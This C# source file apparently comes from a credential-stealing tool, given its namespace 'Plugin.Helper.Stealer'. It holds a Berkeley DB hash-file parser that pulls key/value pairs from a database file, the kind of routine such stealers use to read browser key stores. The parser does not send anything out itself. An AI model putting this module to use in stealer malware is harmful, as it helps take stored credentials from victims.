

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;


namespace Plugin.Helper.Stealer
{
	public class BerkelyParser
	{
		public static KeyValuePair<string, byte[]>[] Parse(byte[] fileBytes)
		{
			List<KeyValuePair<string, byte[]>> keyValuePairList = new List<KeyValuePair<string, byte[]>>();
			if (BerkelyParser.ReadUIntBigEndian(fileBytes, 0) != 398689U)
				return (KeyValuePair<string, byte[]>[]) null;
			int num1 = (int) BerkelyParser.ReadUIntBigEndian(fileBytes, 12);
			int num2 = (int) BerkelyParser.ReadUIntBigEndian(fileBytes, 56);
			int num3 = 1;
			while (keyValuePairList.Count < num2)
			{
				int length = (num2 - keyValuePairList.Count) * 2;
				ushort[] array1 = new ushort[length];
				for (int index = 0; index < length; ++index)
					array1[index] = BitConverter.ToUInt16(fileBytes, num1 * num3 + 2 + index * 2);
				Array.Sort<ushort>(array1);
				for (int index1 = 0; index1 < array1.Length; index1 += 2)
				{
					int count = (int) array1[index1] + num1 * num3;
					int index2 = (int) array1[index1 + 1] + num1 * num3;
					int num4 = index1 + 2 >= array1.Length ? num1 + num1 * num3 : (int) array1[index1 + 2] + num1 * num3;
					string key = Encoding.Default.GetString(fileBytes, index2, num4 - index2);
					byte[] array2 = ((IEnumerable<byte>) fileBytes).Skip<byte>(count).Take<byte>(index2 - count).ToArray<byte>();
					if (!string.IsNullOrWhiteSpace(key))
						keyValuePairList.Add(new KeyValuePair<string, byte[]>(key, array2));
				}
				++num3;
			}
			return keyValuePairList.ToArray();
		}

		private static uint ReadUIntBigEndian(byte[] buffer, int offset)
		{
			return (uint) ((int) buffer[offset] << 24 | (int) buffer[offset + 1] << 16 | (int) buffer[offset + 2] << 8) | (uint) buffer[offset + 3];
		}
	}
}
